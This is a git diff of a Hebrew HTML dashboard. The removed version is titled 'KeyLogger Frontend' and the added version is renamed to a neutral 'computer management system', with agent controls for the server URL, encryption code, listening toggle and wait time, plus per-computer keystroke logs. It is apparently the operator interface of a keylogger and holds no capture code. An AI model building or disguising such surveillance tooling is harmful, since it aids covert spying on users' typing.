@@ -1,38 +1,88 @@
 <!DOCTYPE html>
-<html lang="he">
+<html lang="he" dir="rtl">
 <head>
-  <meta charset="UTF-8">
-  <title>KeyLogger Frontend</title>
-  <link rel="stylesheet" href="style.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>מערכת ניהול מחשבים</title>
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Heebo:wght@300;400;700&display=swap" rel="stylesheet">
 </head>
 <body>
-  <h1>KeyLogger – תצוגת נתונים</h1>
 
-  <section id="machines-section">
-    <h2>רשימת מחשבים</h2>
-    <button onclick="loadMachines()">טען מחשבים</button>
-    <ul id="machines-list"></ul>
-  </section>
+    <nav class="navbar">
+        <div class="nav-brand">מערכת ניהול</div>
+        <ul class="nav-links">
+            <li class="nav-item"><a href="#" class="active">בית</a></li>
+            <li class="nav-item"><a href="#">לוגים</a></li>
+            <li class="nav-item"><a href="#">הגדרות</a></li>
+        </ul>
+    </nav>
 
-<section id="search-section">
-  <h2>חיפוש לפי תאריך וטווח שעות</h2>
-  <div class="search-form">
-    <label>תאריך: <input type="date" id="search-date"></label>
-    <label>משעה: <input type="time" id="search-start"></label>
-    <label>עד שעה: <input type="time" id="search-end"></label>
-    <button onclick="searchLogs()">חפש</button>
-  </div>
-</section>
+    <div class="container">
+        <header class="header">
+            <h1>ניהול מחשבים</h1>
+        </header>
 
+        <section class="section computers-section">
+            <h2>רשימת מחשבים</h2>
+            <div id="computers-list" class="computers-list">
+                </div>
+        </section>
 
-  <section id="keystrokes-section">
-    <h2>הקלדות</h2>
-    <pre id="keystrokes-output">בחר מחשב כדי להציג את ההקלדות</pre>
-  </section>
+        <section class="section alerts-section">
+            <h2>התראות</h2>
+            <div class="alert-actions">
+                <button class="btn btn-create-alert">יצירת התראה חדשה</button>
+                <button class="btn btn-delete-alert">מחיקת התראה</button>
+            </div>
+            <ul id="alerts-list" class="alerts-list">
+                </ul>
+        </section>
 
+        <section class="section agent-section">
+            <h2>ניהול הסוכן</h2>
+            <div class="agent-options">
+                <div class="option-item">
+                    <label for="url-input">שינוי URL:</label>
+                    <input type="text" id="url-input" placeholder="הזן URL חדש">
+                    <button class="btn btn-agent-action">שמור</button>
+                </div>
+                <div class="option-item">
+                    <label for="encryption-input">שינוי קוד הצפנה:</label>
+                    <input type="text" id="encryption-input" placeholder="הזן קוד הצפנה חדש">
+                    <button class="btn btn-agent-action">שמור</button>
+                </div>
+                <div class="option-item">
+                    <button id="toggle-agent-btn" class="btn btn-agent-action btn-toggle-agent">התחלת האזנה</button>
+                </div>
+                <div class="option-item">
+                    <label for="wait-time-input">שינוי זמן המתנה (שניות):</label>
+                    <input type="number" id="wait-time-input" placeholder="זמן חדש">
+                    <button class="btn btn-agent-action">שמור</button>
+                </div>
+            </div>
+        </section>
 
+        <section class="section logs-section hidden" id="logs-page">
+            <h2>לוגים של <span id="log-computer-name"></span></h2>
+            <div class="log-filters">
+                <div class="filter-item">
+                    <label for="date-filter">סינון לפי תאריך:</label>
+                    <input type="date" id="date-filter">
+                    <input type="time" id="time-filter">
+                </div>
+                <div class="filter-item">
+                    <label for="search-text">חיפוש:</label>
+                    <input type="text" id="search-text" placeholder="חיפוש בטקסט חופשי">
+                </div>
+                <button class="btn btn-filter">סנן</button>
+            </div>
+            <div id="logs-list" class="logs-list">
+                </div>
+        </section>
 
+    </div>
 
-  <script src="script.js"></script>
+    <script src="script.js"></script>
 </body>
 </html>
